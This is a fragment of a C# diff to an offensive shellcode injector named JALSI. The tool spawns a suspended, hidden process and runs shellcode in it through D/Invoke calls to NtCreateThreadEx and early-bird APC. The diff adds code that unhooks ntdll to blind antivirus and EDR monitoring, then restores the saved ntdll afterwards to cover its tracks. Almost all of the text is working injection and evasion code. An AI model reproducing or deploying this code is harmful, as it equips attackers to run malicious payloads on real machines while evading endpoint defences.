         Console.WriteLine("[*] Got handle for PID {0} : {1}", TargetProcessID, TargetProcessHandle.ToString("X4"));
         IntPtr AllocationAddress = new IntPtr();
@@ -1025,6 +1555,8 @@ public class JALSI {
             var createThreadResult = DInvokeCore.NtCreateThreadEx(ref threadHandle, desiredAccess, pObjectAttributes, TargetProcessHandle, AllocationAddress, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);
             if (threadHandle != ZeroPointerToCheck) {
                 Console.WriteLine("[+] Thread created at {0}! Sh3llc0d3 executed!", threadHandle.ToString("X4"));
+                // restore in-memory DLL
+                PatchDLLTextOnMem(SavedDLLBeforeUnhooked, "ntdll.dll");
                 Console.WriteLine("[         ----!SEQUENCE==FINISHED!----         ]");
                 return true;
             }else {
@@ -1044,18 +1576,23 @@ public class JALSI {
         Console.WriteLine("[           Written By GetRektBoy724           ]");
         Console.WriteLine("[----------------------------------------------]");
         Console.WriteLine("[          ----!SEQUENCE=STARTED!----          ]");
+        Console.WriteLine("[*] Running Memory DLL Refresher (SharpUnhooker ofcourse) ...");
+        // save DLL from memory for later we're going to restore (in-case if AVs/EDRs hooked it)
+        byte[] SavedDLLBeforeUnhooked = new byte[0];
+        SaveDLLTextFromMem("ntdll.dll", ref SavedDLLBeforeUnhooked);
+        SilentUnhooker("ntdll.dll");
         // CreateProcess parameters 
-        STARTUPINFOEX sInfoEx = new STARTUPINFOEX();
-        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
+        DInvokeCore.STARTUPINFOEX sInfoEx = new DInvokeCore.STARTUPINFOEX();
+        DInvokeCore.PROCESS_INFORMATION pInfo = new DInvokeCore.PROCESS_INFORMATION();
         sInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(sInfoEx);
-        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
-        SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
+        DInvokeCore.SECURITY_ATTRIBUTES pSec = new DInvokeCore.SECURITY_ATTRIBUTES();
+        DInvokeCore.SECURITY_ATTRIBUTES tSec = new DInvokeCore.SECURITY_ATTRIBUTES();
         pSec.nLength = Marshal.SizeOf(pSec);
         tSec.nLength = Marshal.SizeOf(tSec);
-        CreationFlags flags = CreationFlags.CreateSuspended | CreationFlags.DetachedProcess | CreationFlags.CreateNoWindow | CreationFlags.CreateUnicodeEnv;
+        DInvokeCore.CreationFlags flags = DInvokeCore.CreationFlags.CreateSuspended | DInvokeCore.CreationFlags.DetachedProcess | DInvokeCore.CreationFlags.CreateNoWindow | DInvokeCore.CreationFlags.CreateUnicodeEnv;
         // spawn the new process
         Console.WriteLine("[*] Spawning new process with executable {0} ...", PathToExecutableForProcess);
-        bool CreateProcessResult = CreateProcess(PathToExecutableForProcess, null, ref pSec, ref tSec, false, flags, IntPtr.Zero, null, ref sInfoEx, out pInfo);
+        bool CreateProcessResult = DInvokeCore.CreateProcess(PathToExecutableForProcess, null, ref pSec, ref tSec, false, flags, IntPtr.Zero, null, ref sInfoEx, out pInfo);
         if (CreateProcessResult) {
             Console.WriteLine("[+] {0}'s process spawned!", PathToExecutableForProcess);
             // NtAllocateVirtualMemory parameters
@@ -1087,6 +1624,8 @@ public class JALSI {
                 Console.WriteLine("[*] Resuming thread and executing APC...");
                 DInvokeCore.NtAlertResumeThread(pInfo.hThread, 0);
                 Console.WriteLine("[+] Sh3llc0d3 executed!");
+                // restore in-memory DLL
+                PatchDLLTextOnMem(SavedDLLBeforeUnhooked, "ntdll.dll");
                 Console.WriteLine("[         ----!SEQUENCE==FINISHED!----         ]");
                 return true;
             }else {
